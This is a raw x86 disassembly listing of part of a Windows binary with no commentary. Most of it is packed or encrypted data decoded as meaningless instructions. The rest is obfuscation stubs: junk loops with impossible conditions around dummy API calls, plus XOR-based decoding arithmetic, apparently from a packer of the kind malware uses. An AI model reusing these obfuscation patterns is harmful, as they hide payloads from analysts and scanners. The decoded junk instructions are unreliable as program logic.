  408c87:	jbe    0x408c80
  408c89:	xchg   BYTE PTR [ecx],ah
  408c8b:	cmp    al,0x9
  408c8d:	jbe    0x408cb0
  408c8f:	add    BYTE PTR [ebx],0xd6
  408c92:	imul   edx,edi
  408c95:	sub    DWORD PTR [eax],edx
  408c97:	mov    eax,DWORD PTR [ebp-0x14]
  408c9a:	jmp    0x408756
  408c9f:	mov    eax,DWORD PTR [ebp-0xc]
  408ca2:	mov    edx,DWORD PTR [ebp-0x18]
  408ca5:	jmp    0x408e2c
  408caa:	test   ecx,ebx
  408cac:	stc    
  408cad:	test   BYTE PTR [ecx+0x64],ah
  408cb0:	sbb    ecx,0x67327607
  408cb6:	aad    0x22
  408cb8:	mov    gs,WORD PTR [esi+0x7e7edc14]
  408cbe:	in     al,0x7f
  408cc0:	jle    0x408d40
  408cc2:	sbb    esi,esp
  408cc4:	lods   eax,DWORD PTR ds:[esi]
  408cc5:	adc    ebp,DWORD PTR [edx*2+0x5286acec]
  408ccc:	clc    
  408ccd:	lock ror edi,0x40
  408cd1:	rcl    esp,cl
  408cd3:	lea    ecx,[eax-0x1c]
  408cd6:	stos   DWORD PTR es:[edi],eax
  408cd7:	push   eax
  408cd8:	xlat   BYTE PTR ds:[ebx]
  408cd9:	fstp   QWORD PTR [ebx+0x5e]
  408cdc:	and    eax,0xa745869b
  408ce1:	aam    0x27
  408ce3:	test   ah,bh
  408ce5:	push   ecx
  408ce6:	add    BYTE PTR [esi-0x5c],bh
  408ce9:	cmp    DWORD PTR [edi-0x4a9fb715],ebp
  408cef:	sbb    ch,BYTE PTR [ecx]
  408cf1:	faddp  st(6),st
  408cf3:	mov    al,0x8a
  408cf5:	out    0x29,al
  408cf7:	stos   DWORD PTR es:[edi],eax
  408cf8:	sbb    edi,DWORD PTR [eax-0x11]
  408cfb:	mov    edx,0x2a5e8085
  408d00:	sub    BYTE PTR [ebp+0x77],dh
  408d03:	out    0x10,eax
  408d05:	cmp    ah,BYTE PTR [ecx-0x7c]
  408d08:	jcxz   0x408ce8
  408d0b:	cdq    
  408d0c:	push   ebx
  408d0d:	stc    
  408d0e:	mov    ?,WORD PTR [edi]
  408d10:	mov    bl,0x49
  408d12:	or     ah,BYTE PTR [ebx+0x7f]
  408d15:	push   esp
  408d17:	fstp   QWORD PTR [ebx+0x3e]
  408d1a:	dec    DWORD PTR [eax+edx*8-0x4d8cea16]
  408d21:	neg    DWORD PTR [edx+0x3a0fc8d9]
  408d27:	inc    edx
  408d28:	sahf   
  408d29:	shl    BYTE PTR [edi],0x8f
  408d2c:	in     al,dx
  408d2d:	out    0xd1,al
  408d2f:	jnp    0x408d88
  408d31:	push   ecx
  408d32:	mov    al,ds:0x86ba68c6
  408d37:	aam    0xb9
  408d39:	test   eax,0x5d9c99b0
  408d3e:	out    0xbd,eax
  408d40:	fiadd  DWORD PTR [edi]
  408d42:	pop    ss
  408d43:	hlt    
  408d44:	(bad)  
  408d45:	fcomi  st,st(2)
  408d47:	xor    BYTE PTR [edx+0x20e36838],al
  408d4d:	mov    edi,0x84ed64a6
  408d52:	es outs dx,BYTE PTR fs:[esi]
  408d55:	imul   eax,DWORD PTR [ebp-0x8096a7],0x7c854f2d
  408d5f:	lea    esi,[edx-0x544f3c53]
  408d65:	adc    DWORD PTR [edx-0x12],0xffffff9f
  408d69:	out    0x62,al
  408d6b:	mov    esp,0xdedcfcd6
  408d70:	sbb    al,BYTE PTR [ecx+ecx*1+0x67]
  408d74:	lds    edi,FWORD PTR [edx+0x7]
  408d77:	cmc    
  408d78:	(bad)  
  408d79:	sub    edx,esp
  408d7b:	jg     0x408d6f
  408d7d:	into   
  408d7e:	cmc    
  408d7f:	retf   0xa58
  408d82:	loope  0x408d63
  408d84:	add    DWORD PTR [ebx+0x11],0x429963c7
  408d8b:	arpl   WORD PTR [edi+eax*1],si
  408d8e:	fadd   QWORD PTR [ebx-0x56d2d074]
  408d94:	call   0x266f:0x37a9af2
  408d9b:	jns    0x408d4e
  408d9d:	ss out dx,al
  408d9f:	xor    edx,esi
  408da1:	xchg   ebx,eax
  408da2:	push   eax
  408da3:	leave  
  408da4:	cmp    ah,BYTE PTR [ebx+0x22b0fec4]
  408daa:	div    BYTE PTR [esi-0x5d]
  408dad:	fcomp  DWORD PTR [edi-0x51ed3217]
  408db3:	es lds edx,FWORD PTR ds:[ebx-0x368a0b16]
  408dbb:	aad    0xc5
  408dbd:	cli    
  408dbe:	bound  esp,QWORD PTR [eax+0x34]
  408dc1:	je     0x408e40
  408dc3:	mov    al,0x86
  408dc5:	pop    edi
  408dc6:	(bad)  
  408dc7:	shr    dl,1
  408dc9:	mov    bl,0x3c
  408dcb:	adc    ebx,0xffffff92
  408dce:	cwde   
  408dcf:	enter  0xec3b,0x3f
  408dd3:	test   DWORD PTR cs:[ebx-0x66],ecx
  408dd7:	dec    esi
  408dd8:	loope  0x408e54
  408dda:	into   
  408ddb:	cwde   
  408ddc:	add    DWORD PTR [ebp-0x72],eax
  408ddf:	dec    edx
  408de0:	stc    
  408de1:	ret    
  408de2:	adc    ch,dl
  408de4:	adc    al,0x86
  408de6:	adc    BYTE PTR [esi-0x66],0x9d
  408dea:	in     al,dx
  408deb:	nop
  408dec:	sub    bl,BYTE PTR [edi-0x6b]
  408def:	vpcomw xmm9,xmm7,XMMWORD PTR [ebx-0x4f],0xa7
  408df6:	jbe    0x408e69
  408df8:	lahf   
  408df9:	out    0xb7,al
  408dfb:	mov    ebp,?
  408dfd:	xor    DWORD PTR [edx+0x66c5157b],eax
  408e03:	jle    0x408e0d
  408e05:	std    
  408e06:	push   edi
  408e07:	adc    bl,BYTE PTR [ebp+0x38]
  408e0a:	ins    DWORD PTR es:[edi],dx
  408e0b:	fdivr  DWORD PTR [edx]
  408e0d:	push   ds
  408e0e:	repz mov bl,0x5a
  408e11:	outs   dx,BYTE PTR ds:[esi]
  408e12:	cmp    BYTE PTR [eax],dl
  408e14:	mov    DWORD PTR [edx+0x53b0b192],ebx
  408e1a:	es sub esp,edx
  408e1d:	ret    
  408e1e:	sub    BYTE PTR [eax-0x29],bl
  408e21:	add    BYTE PTR [ebp+0x10590e90],ah
  408e27:	push   ecx
  408e28:	jb     0x408e67
  408e2a:	int3   
  408e2b:	xchg   edi,eax
  408e2c:	xor    eax,edx
  408e2e:	cmp    eax,0x7aa80c5b
  408e33:	je     0x40858a
  408e39:	mov    eax,DWORD PTR [ebp-0x10]
  408e3c:	add    DWORD PTR [eax],0x7403501
  408e42:	jmp    0x40858a
  408e47:	mov    eax,DWORD PTR [ebp-0x1c]
  408e4a:	jmp    0x408fd1
  408e4f:	xor    eax,0xa417048d
  408e54:	xchg   edi,eax
  408e55:	xor    eax,0xaa1dcad
  408e5a:	jmp    0x725b9963
  408e5f:	cli    
  408e60:	fnstsw WORD PTR [esi+0x7e]
  408e63:	in     al,0x7f
  408e65:	jle    0x408ee5
  408e67:	outs   dx,BYTE PTR ds:[esi]
  408e68:	les    edx,FWORD PTR [eax+0x71b7fafe]
  408e6e:	fimul  WORD PTR [eax-0x7a]
  408e71:	mov    edx,0x9e58adfa
  408e76:	jle    0x408e8b
  408e78:	enter  0x68e2,0x9e
  408e7c:	(bad)  
  408e7d:	clc    
  408e7e:	pop    esp
  408e7f:	ds mov ah,0xd
  408e82:	xchg   ebp,eax
  408e83:	add    eax,0x5ea145af
  408e88:	add    eax,0x5f61d5f9
  408e8d:	sti    
  408e8e:	lahf   
  408e8f:	outs   dx,BYTE PTR ds:[esi]
  408e90:	and    BYTE PTR [esi+edi*4+0x41],ah
  408e94:	push   0xc3e00107
  408e99:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408e9a:	out    0xa3,al
  408e9c:	js     0x408ec3
  408e9e:	les    ecx,FWORD PTR [ebx+ebp*8+0x17]
  408ea2:	out    dx,al
  408ea3:	jp     0x408e92
  408ea5:	xchg   BYTE PTR [edi-0x23],ch
  408ea8:	mov    edx,0xb252d49
  408ead:	in     eax,0xc6
  408eaf:	retf   
  408eb0:	aad    0x76
  408eb2:	cmp    eax,edi
  408eb4:	jmp    0x408e7d
  408eb6:	aas    
  408eb7:	push   edx
  408eb8:	test   eax,0x18ead4ec
  408ebd:	pop    es
  408ebe:	xchg   ecx,eax
  408ebf:	lea    edx,[eax+esi*2]
  408ec2:	xor    BYTE PTR [ebp-0x6b],0xbb
  408ec6:	adc    al,0x1f
  408ec8:	aam    0x9e
  408eca:	xchg   ebp,eax
  408ecb:	add    al,0xc1
  408ecd:	add    DWORD PTR [ebx],ebp
  408ecf:	cwde   
  408ed0:	fdivr  DWORD PTR [ecx+0x6a]
  408ed3:	xchg   edi,eax
  408ed4:	imul   ebx,DWORD PTR [esi-0x1b82cab5],0xffffff93
  408edb:	jle    0x408f57
  408edd:	lds    esp,FWORD PTR gs:0x4866f351
  408ee4:	xchg   esp,eax
  408ee5:	push   esp
  408ee6:	jmp    0x9867:0x4b85ad2a
  408eed:	cwde   
  408eee:	xor    esi,esi
  408ef0:	pop    ss
  408ef1:	sbb    BYTE PTR [ebp-0x63],cl
  408ef4:	or     al,BYTE PTR [ecx+0x4533abd2]
  408efa:	pop    ecx
  408efb:	jb     0x408efe
  408efd:	mov    esi,0xa2027848
  408f02:	dec    esi
  408f03:	leave  
  408f04:	adc    ebp,DWORD PTR [edi-0x4fdaa9ac]
  408f0a:	jg     0x408f17
  408f0c:	jae    0x408f8c
  408f0e:	sbb    eax,0x958ab13d
  408f13:	fnstcw WORD PTR [eax]
  408f15:	xchg   edx,eax
  408f16:	push   es
  408f17:	mov    DWORD PTR [ebx+0x5400b513],edi
  408f1d:	loope  0x408ef5
  408f1f:	ins    BYTE PTR es:[edi],dx
  408f20:	aam    0x21
  408f22:	add    al,dl
  408f24:	mov    dl,0x51
  408f26:	and    BYTE PTR [esi-0x34963da7],ah
  408f2c:	inc    ebx
  408f2d:	mov    al,0x67
  408f2f:	jne    0x408f6c
  408f31:	pop    esi
  408f32:	das    
  408f33:	dec    eax
  408f34:	repnz push ds
  408f36:	sub    ah,BYTE PTR [esi+0x1905091d]
  408f3c:	icebp  
  408f3d:	mov    BYTE PTR [edx+0x5],bl
  408f40:	or     al,0x51
  408f42:	sbb    BYTE PTR [edi+0x8c899c3],bh
  408f48:	stos   BYTE PTR es:[edi],al
  408f49:	data16 and al,0xa7
  408f4c:	imul   esi,DWORD PTR [esp+ecx*8-0xd],0x6ed0a47b
  408f54:	(bad)  [edi-0x4f5b1de0]
  408f5a:	(bad)  
  408f5c:	in     eax,0xdd
  408f5e:	loop   0x408f13
  408f60:	sbb    al,0x8f
  408f62:	(bad)  
  408f63:	int3   
  408f64:	in     al,dx
  408f65:	inc    esp
  408f66:	pop    di
  408f68:	pop    ss
  408f69:	mov    WORD PTR ds:0x471632a2,cs
  408f6f:	xchg   esp,eax
  408f70:	fdivr  QWORD PTR [ecx]
  408f72:	and    DWORD PTR [edx-0x36e2675],ebp
  408f78:	lahf   
  408f79:	out    0x8e,eax
  408f7b:	mov    dh,0xb6
  408f7d:	sbb    DWORD PTR [ebp+0x65ebdffd],0xc75e5891
  408f87:	loop   0x408f2c
  408f89:	out    0x7,eax
  408f8b:	cmp    DWORD PTR [ecx+0x7d],ebx
  408f8e:	adc    BYTE PTR [ecx+0x1442af87],ah
  408f94:	gs mov eax,0x2262464a
  408f9a:	add    al,0x37
  408f9c:	cdq    
  408f9d:	inc    esp
  408f9e:	ret    0xf302
  408fa1:	jbe    0x408f2a
  408fa3:	and    edi,DWORD PTR [ebx-0x73]
  408fa6:	mov    esi,0xcbf20986
  408fab:	enter  0xa3d2,0x7d
  408faf:	xchg   edi,eax
  408fb0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408fb1:	xchg   edx,eax
  408fb2:	xor    cl,cl
  408fb4:	pop    ecx
  408fb5:	jecxz  0x408f97
  408fb7:	loopne 0x409012
  408fb9:	jnp    0x408fe9
  408fbb:	sub    al,0xca
  408fbd:	cmp    al,0x84
  408fbf:	daa    
  408fc0:	stc    
  408fc1:	(bad)  
  408fc2:	bound  ebp,QWORD PTR [eax+edx*1-0x28c695]
  408fc9:	ins    DWORD PTR es:[edi],dx
  408fca:	dec    ebp
  408fcb:	sbb    esi,DWORD PTR [edx-0x34]
  408fce:	and    BYTE PTR [edx+eax*8+0x39],dl
  408fd2:	cmp    BYTE PTR [edi],cl
  408fd4:	test   BYTE PTR [ecx-0x4700000b],dh
  408fda:	call   0xf8fe:0xe9800f1c
  408fe1:	(bad)  
  408fe2:	call   DWORD PTR [ebp-0x75]
  408fe5:	in     al,dx
  408fe6:	sub    esp,0x20
  408fe9:	sub    ecx,eax
  408feb:	mov    eax,ds:0x413bde
  408ff0:	and    DWORD PTR ds:0x4337af,0x0
  408ffa:	jmp    0x40900c
  408fff:	mov    ecx,DWORD PTR ds:0x4337af
  409005:	inc    ecx
  409006:	mov    DWORD PTR ds:0x4337af,ecx
  40900c:	cmp    DWORD PTR ds:0x4337af,0x1c
  409013:	jae    0x409040
  409019:	cmp    DWORD PTR ds:0x4337af,0x20
  409020:	jne    0x40903b
  409026:	push   0x4819
  40902b:	push   0x30ae
  409030:	push   0x3675
  409035:	call   DWORD PTR ds:0x412014
  40903b:	jmp    0x408fff
  409040:	mov    eax,DWORD PTR [eax+0x198]
  409046:	mov    DWORD PTR [ebp-0x8],eax
  409049:	and    DWORD PTR ds:0x4337eb,0x0
  409053:	mov    ecx,DWORD PTR ds:0x4337eb
  409059:	inc    ecx
  40905a:	mov    DWORD PTR ds:0x4337eb,ecx
  409060:	cmp    DWORD PTR ds:0x4337eb,0x1c
  409067:	jne    0x409085
  40906d:	push   0x43382f
  409072:	push   0x494f
  409077:	push   0x43389a
  40907c:	push   DWORD PTR [ebp-0x24]
  40907f:	call   DWORD PTR ds:0x412394
  409085:	cmp    DWORD PTR ds:0x4337eb,0x13
  40908c:	jb     0x409053
  409092:	mov    eax,DWORD PTR [ebp+0x8]
  409095:	and    ecx,DWORD PTR ds:0x4337f3
  40909b:	mov    ecx,DWORD PTR [ebp-0x8]
  40909e:	sbb    DWORD PTR ds:0x433803,0x43383b
  4090a8:	push   ebx
  4090a9:	xor    DWORD PTR ds:0x433777,0x7c2a
  4090b3:	push   esi
  4090b4:	mov    esi,DWORD PTR ds:0x4337c7
  4090ba:	mov    ebx,DWORD PTR ds:0x4337db
  4090c0:	sub    ebx,esi
  4090c2:	or     esi,DWORD PTR [esi+ebx*1]
  4090c5:	mov    esi,0x7510854
  4090ca:	xor    eax,esi
  4090cc:	adc    DWORD PTR ds:0x4337a7,0x43372f
  4090d6:	push   edi
  4090d7:	mov    edi,0x32729b
  4090dc:	and    ebx,DWORD PTR ds:0x433727
  4090e2:	add    eax,edi
  4090e4:	mov    DWORD PTR [ecx],eax
  4090e6:	or     DWORD PTR ds:0x43383b,ebx
  4090ec:	lea    eax,[ebp-0x4]
  4090ef:	mov    DWORD PTR [ebp-0x10],eax
  4090f2:	mov    eax,DWORD PTR [ebp+0x8]
  4090f5:	mov    ecx,DWORD PTR [ebp-0x10]
  4090f8:	xor    eax,esi
  4090fa:	sbb    ebx,0x3e7b
  409100:	add    eax,edi
  409102:	mov    DWORD PTR ds:0x433713,0x17
  40910c:	cmp    DWORD PTR ds:0x433713,0x0
  409113:	je     0x40914b
  409119:	cmp    DWORD PTR ds:0x433713,0x27
  409120:	jne    0x409139
  409126:	push   0x3901
  40912b:	push   0x70c3
  409130:	push   DWORD PTR [ebp-0x1c]
  409133:	call   DWORD PTR ds:0x412398
  409139:	mov    ebx,DWORD PTR ds:0x433713
  40913f:	dec    ebx
  409140:	mov    DWORD PTR ds:0x433713,ebx
  409146:	jmp    0x40910c
  40914b:	mov    DWORD PTR [ecx],eax
  40914d:	neg    DWORD PTR ds:0x4337a7
  409153:	jmp    0x409474
  409158:	add    eax,0x73dd76a0
  40915d:	jmp    0x619bf1f7
  409162:	mov    ch,0x2
  409164:	retf   
  409165:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409166:	fdiv   QWORD PTR [esi]
  409168:	pusha  
  409169:	fidivr DWORD PTR [esi+0x7e]
  40916c:	jp     0x4091eb
  40916e:	jle    0x4091ee
  409170:	icebp  
  409171:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409172:	pop    edi
  409173:	push   ecx
  409174:	ds jae 0x409127
  409177:	push   ebx
  409178:	rcl    DWORD PTR [esi-0x37],1
  40917b:	(bad)  
  40917c:	mov    ah,0x91
  40917e:	clc    
  40917f:	lock lock and al,0x96
  409183:	scas   eax,DWORD PTR es:[edi]
  409184:	addr16 mov dh,0x32
  409187:	dec    eax
  409188:	xchg   esp,eax
  409189:	mov    ecx,0x49dd8d37
  40918e:	xor    edx,DWORD PTR [esp+ebx*1]
  409191:	out    dx,eax
  409192:	ja     0x40915d
  409194:	cld    
  409195:	and    ebp,DWORD PTR [edi+0x2c36ac1b]
  40919b:	ret    
  40919c:	mov    eax,ds:0x2e654a2a
  4091a1:	inc    edi
  4091a2:	jmp    0x1133:0x88110ce3
  4091a9:	push   0xe4ffe6b7
  4091ae:	and    ebp,DWORD PTR [eax+0x79]
  4091b1:	sar    DWORD PTR [edx+edi*2-0x1c],1
  4091b5:	dec    esi
  4091b6:	adc    dl,ch
  4091b8:	(bad)  
  4091b9:	and    ah,BYTE PTR ds:0xbd3fbd5f
  4091bf:	sti    
  4091c0:	push   ecx
  4091c1:	fnstcw WORD PTR [ecx+eax*4-0x76]
  4091c5:	push   ss
  4091c6:	fnstcw WORD PTR [edx-0x632e1424]
  4091cc:	dec    edi
  4091cd:	cmp    BYTE PTR [edi-0x35bd7f8e],bl
  4091d3:	dec    ecx
  4091d4:	dec    ebp
  4091d5:	imul   BYTE PTR [edx]
  4091d7:	mov    edx,0xe8407e25
  4091dc:	xor    eax,0x466003f3
  4091e1:	mov    esi,0xa3c73abb
  4091e6:	(bad)  
  4091e7:	xor    DWORD PTR [esi+ebx*4-0x5a],edi
  4091eb:	or     ch,ch
  4091ed:	(bad)  
  4091ee:	cmc    
  4091ef:	mov    ch,0x91
  4091f1:	nop
  4091f2:	adc    ah,BYTE PTR [esp+ebx*2-0x2f]
  4091f6:	sub    bh,cl
  4091f8:	test   al,0xa
  4091fa:	dec    eax
  4091fb:	sub    al,0xc0
  4091fd:	stc    
  4091fe:	ret    
  4091ff:	arpl   WORD PTR [esi+eiz*2+0x3f1736a6],bp
  409206:	add    eax,0x56b787b8
  40920b:	cmp    ecx,ebp
  40920d:	dec    esi
  40920e:	repnz out dx,eax
  409210:	outs   dx,DWORD PTR ds:[esi]
  409211:	div    DWORD PTR [esi]
  409213:	sub    ah,bh
  409215:	sbb    BYTE PTR [edi],0x1
  409218:	sub    ah,dh
  40921a:	pop    ebx
  40921b:	sub    al,dh
  40921d:	arpl   WORD PTR [ebx],bx
  40921f:	sub    esi,esp
  409221:	add    DWORD PTR [ebx+0x23],eax
  409224:	adc    al,0x32
  409226:	cmp    eax,0x8b55acb3
  40922b:	ins    BYTE PTR es:[edi],dx
  40922c:	jle    0x409281
  40922e:	inc    edx
  40922f:	xlat   BYTE PTR ds:[ebx]
  409230:	sbb    BYTE PTR [ebp+ebx*1-0x737daf96],dl
  409237:	dec    esi
  409238:	xchg   ebp,eax
  409239:	xor    al,0xf
  40923b:	stc    
  40923c:	jle    0x4091eb
  40923e:	inc    ecx
  40923f:	mov    esi,0x6263c94a
  409244:	(bad)  
  409245:	sub    BYTE PTR [edx+0x2c],dh
  409248:	popf   
  409249:	jo     0x4091d1
  40924b:	lods   al,BYTE PTR ds:[esi]
  40924c:	mov    dh,0x4a
  40924e:	jno    0x409287
  409250:	mov    ecx,0x13c51d93
  409255:	leave  
  409256:	xchg   ecx,eax
  409257:	push   esp
  409258:	mov    eax,ds:0x669ff084
  40925d:	mov    bl,0xc7
  40925f:	fidiv  WORD PTR [edi]
  409261:	cmp    dh,bl
  409263:	pop    edi
  409264:	into   
  409265:	pop    edi
  409266:	jo     0x409231
  409268:	shr    cl,cl
  40926a:	fild   QWORD PTR [edx]
  40926c:	mov    eax,0x556c8656
  409271:	jns    0x409276
  409273:	xchg   ebp,eax
  409274:	(bad)  
  409275:	out    dx,al
  409276:	loope  0x40924e
  409278:	dec    ebp
  409279:	sub    eax,0x8a66c4b2
  40927e:	jecxz  0x4092ca
  409280:	ins    BYTE PTR es:[edi],dx
  409281:	dec    ecx
  409282:	enter  0x73d5,0x50
  409286:	jmp    0x3d92:0xb34db08
  40928d:	ror    BYTE PTR [ebp-0x76ef6627],1
  409293:	shr    BYTE PTR [edi-0x7e7e0015],0x80
  40929a:	or     al,0xd1
  40929c:	das    
  40929d:	(bad)  
  40929e:	icebp  
  40929f:	mov    ecx,0xe09bdbf9
  4092a4:	push   0xdf14e0d9
  4092a9:	pusha  
  4092aa:	sub    bh,BYTE PTR [eax-0x288a0511]
  4092b0:	(bad)  
  4092b1:	aas    
  4092b2:	dec    edx
  4092b3:	les    ebx,FWORD PTR [ecx+0x3c7882ba]
  4092b9:	hlt    
  4092ba:	adc    al,0x75
  4092bc:	adc    ebx,DWORD PTR [edx+0x2f]
  4092bf:	inc    ebx
  4092c0:	jmp    0x1a0b:0x468fb3d
  4092c7:	dec    ebp
  4092c8:	push   ebx
  4092c9:	mov    ds:0x2ea42d93,al
  4092ce:	outs   dx,BYTE PTR ds:[esi]
  4092cf:	sub    eax,0x1fdea4f9
  4092d4:	sbb    DWORD PTR [edi],0xffffffaf
  4092d7:	dec    edx
  4092d8:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  4092da:	(bad)  
  4092db:	mov    dh,0xe0
  4092dd:	sub    eax,0x813bd6bf
  4092e2:	aaa    
  4092e3:	cli    
  4092e4:	pop    ebp
  4092e5:	ins    DWORD PTR es:[edi],dx
  4092e6:	adc    dl,BYTE PTR [ebp-0x37]
  4092e9:	jmp    0xb4d855c9
  4092ee:	sub    edx,DWORD PTR [esi-0x62]
  4092f1:	cmp    esp,DWORD PTR [ebp+0xfe0fb19]
  4092f7:	imul   ecx,DWORD PTR [edx],0x1b
  4092fa:	mov    ebp,0x9926a018
  4092ff:	sbb    ch,BYTE PTR [eax+0x4557ea7a]
  409305:	push   ecx
  409306:	mov    cl,0x12
  409308:	ins    DWORD PTR es:[edi],dx
  409309:	cli    
  40930a:	pop    ecx
  40930b:	dec    edi
  40930c:	pop    ecx
  40930d:	or     ecx,DWORD PTR [esi+0x70]
  409310:	adc    al,0xbe
  409312:	jecxz  0x4092bf
  409314:	mov    bh,al
  409316:	mov    cl,0x9a
  409318:	or     BYTE PTR [ebx-0x2c],ah
  40931b:	outs   dx,DWORD PTR ds:[esi]
  40931c:	lea    esi,[ecx]
  40931e:	mov    bh,0x82
  409320:	sub    dl,BYTE PTR [ebp+0x13616bc]
  409326:	retf   0xfc2e
  409329:	mov    eax,cs
  40932b:	and    edi,DWORD PTR [edi-0x507c6f24]
  409331:	mov    bl,0xd3
  409333:	adc    bh,bl
  409335:	xor    eax,0x472a6ca0
  40933a:	xor    BYTE PTR [ecx],dl
  40933c:	fs mov ebx,0xa316f9c3
  409342:	leave  
  409343:	sub    BYTE PTR [esi],ch
  409345:	sub    BYTE PTR [ebp-0x5d910f01],0xbe
  40934c:	lock xor eax,0x98ee1999
  409352:	xor    al,0xea
  409354:	cmp    edi,DWORD PTR [edi]
  409356:	sbb    DWORD PTR [eax],eax
  409358:	mov    esp,0xc71adf0a
  40935d:	in     eax,0xdf
  40935f:	cli    
  409360:	(bad)  
  409362:	std    
  409363:	xchg   esp,eax
  409364:	arpl   WORD PTR [ebp+0x2c],ax
  409367:	mov    DWORD PTR [esi],edx
  409369:	sub    edi,0xf0b2f448
  40936f:	jl     0x4093d1
  409371:	(bad)  
  409372:	fnsave [ebx]
  409374:	(bad)  
  409375:	in     al,dx
  409376:	xchg   ecx,eax
  409377:	or     esp,DWORD PTR [edi+ecx*8+0xfdaa0ed]
  40937e:	push   edx
  40937f:	out    dx,al
  409380:	sbb    eax,0xda321a29
  409385:	inc    esi
  409386:	mov    eax,ds:0x8251e3cb
  40938b:	fs stos DWORD PTR es:[edi],eax
  40938d:	out    0xba,al
  40938f:	lea    esp,[eax+0x49714673]
  409395:	loop   0x40940b
  409397:	push   edx
  409398:	inc    eax
  409399:	sbb    eax,DWORD PTR [edi-0x24]
  40939c:	neg    bl
  40939e:	xor    al,BYTE PTR [ebx+edx*1-0x5d]
  4093a2:	sbb    eax,0x9238a3
  4093a7:	mov    edi,0xdd1273c0
  4093ac:	in     eax,0xe2
  4093ae:	shr    DWORD PTR [edx],1
  4093b0:	js     0x40937f
  4093b2:	or     al,0xc0
  4093b4:	ror    DWORD PTR [edi-0x3d],cl
  4093b7:	pop    eax
  4093b8:	xlat   BYTE PTR ds:[ebx]
  4093b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4093ba:	arpl   WORD PTR [ebp+edi*2+0x37],bp
  4093be:	in     al,dx
  4093bf:	repnz dec esi
  4093c1:	cmp    edx,ebx
  4093c3:	imul   BYTE PTR [ecx+0x5c9208b1]
  4093c9:	je     0x409390
  4093cb:	imul   ebp,DWORD PTR [ecx-0x170469c9],0xffffff81
  4093d2:	fcomp  DWORD PTR [edx+0x47]
  4093d5:	push   ebp
  4093d6:	mov    al,ds:0x56b10ee0
  4093db:	push   edi
  4093dc:	test   DWORD PTR [ebx],0xf8ef649b
  4093e2:	inc    esp
  4093e3:	mov    bl,0x32
  4093e5:	push   ax
  4093e7:	pop    ebp
  4093e8:	imul   esi,DWORD PTR [esp+edi*1],0xc9125336
  4093ef:	addr16 xchg ecx,eax
  4093f1:	gs enter 0xab81,0x4c
  4093f6:	mov    ds:0xfb60dde3,al
  4093fb:	mov    fs,WORD PTR [edx-0x4a7c4f6]
  409401:	mov    edi,0xce77a35d
  409406:	rcpps  xmm1,XMMWORD PTR [eax-0x1fa7f025]
  40940d:	cmp    BYTE PTR [ebx-0x5],dl
  409410:	inc    eax
  409411:	in     al,0xb5
  409413:	int3   
  409414:	inc    ecx
  409415:	pop    edx
  409416:	xchg   ebx,eax
  409417:	retf   0x713d
  40941a:	fldcw  WORD PTR [ebx+esi*4-0x316730c5]
  409421:	sbb    al,0x4f
  409423:	les    esp,FWORD PTR [ebx-0x7b]
  409426:	icebp  
  409427:	push   ss
  409428:	push   ss
  409429:	cmovle ecx,edi
  40942c:	pop    ebp
  40942d:	dec    ecx
  40942e:	cmp    eax,0x59626a77
  409433:	push   edi
  409434:	mov    eax,0xf1eefdd2
  409439:	cld    
  40943a:	push   ss
  40943b:	ret    0x2b74
  40943e:	add    al,0x1f
  409440:	pop    es
  409441:	sbb    BYTE PTR [edx+0x41],bh
  409444:	push   ds
  409445:	lock and eax,0x3417cdaf
  40944b:	lods   eax,DWORD PTR ds:[esi]
  40944c:	mov    al,ds:0x4109cbfd
  409451:	(bad)  
  409452:	out    dx,eax
  409453:	in     eax,0xbd
  409455:	ret    0x44a3
  409458:	sahf   
  409459:	xlat   BYTE PTR ds:[ebx]
  40945a:	scas   eax,DWORD PTR es:[edi]
  40945b:	dec    edi
  40945c:	inc    ebx
  40945d:	mov    ecx,0x15175974
  409462:	mov    dh,0x7a
  409464:	xchg   esi,eax
  409465:	push   es
  409466:	scas   eax,DWORD PTR es:[edi]
  409467:	inc    esp
  409468:	les    esp,FWORD PTR [esi+eiz*8-0x6e]
  40946c:	mov    al,ds:0xec82c5f9
  409471:	inc    eax
  409472:	or     DWORD PTR [esi-0x39],edi
  409475:	inc    ebp
  409476:	in     al,dx
  409477:	xor    DWORD PTR [ebp+0x2581f89c],eax
  40947d:	sub    edi,DWORD PTR [eax]
  40947f:	inc    ebx
  409480:	add    BYTE PTR [eax],al
  409482:	add    BYTE PTR [eax],al
  409484:	add    BYTE PTR [ebx],dh
  409486:	leave  
  409487:	add    ecx,DWORD PTR ds:0x43382b
  40948d:	inc    ecx
  40948e:	mov    DWORD PTR ds:0x43382b,ecx
  409494:	cmp    DWORD PTR ds:0x43382b,0x23
  40949b:	jne    0x4094bf
  4094a1:	push   0x7f04
  4094a6:	push   DWORD PTR [ebp-0xc]
  4094a9:	push   DWORD PTR [ebp-0x28]
  4094ac:	push   0x10bc
  4094b1:	push   DWORD PTR [ebp-0x10]
  4094b4:	push   0x1509
  4094b9:	call   DWORD PTR ds:0x41239c
  4094bf:	cmp    DWORD PTR ds:0x43382b,0x13
  4094c6:	jb     0x409485
  4094cc:	sub    DWORD PTR ds:0x433713,ecx
  4094d2:	lea    eax,[ebp-0x14]
  4094d5:	and    DWORD PTR ds:0x433777,0x0
  4094df:	jmp    0x4094f1
  4094e4:	mov    ebx,DWORD PTR ds:0x433777
  4094ea:	inc    ebx
  4094eb:	mov    DWORD PTR ds:0x433777,ebx
  4094f1:	cmp    DWORD PTR ds:0x433777,0x13
  4094f8:	jae    0x40951b
  4094fe:	cmp    DWORD PTR ds:0x433777,0x22
  409505:	jne    0x409516
  40950b:	push   0x24ee
  409510:	call   DWORD PTR ds:0x4123a0
  409516:	jmp    0x4094e4
  40951b:	mov    DWORD PTR [ebp-0x20],eax
  40951e:	and    DWORD PTR ds:0x43377b,0x0
  409528:	jmp    0x409538
  40952d:	mov    eax,ds:0x43377b
  409532:	inc    eax
  409533:	mov    ds:0x43377b,eax
  409538:	cmp    DWORD PTR ds:0x43377b,0x11
  40953f:	jae    0x409578
  409545:	cmp    DWORD PTR ds:0x43377b,0x9
  40954c:	jne    0x40955b
  409552:	push   DWORD PTR [ebp-0x1c]
  409555:	call   DWORD PTR ds:0x412018
  40955b:	cmp    DWORD PTR ds:0x43377b,0x8
  409562:	jne    0x409573
  409568:	mov    eax,ds:0x43377b
  40956d:	inc    eax
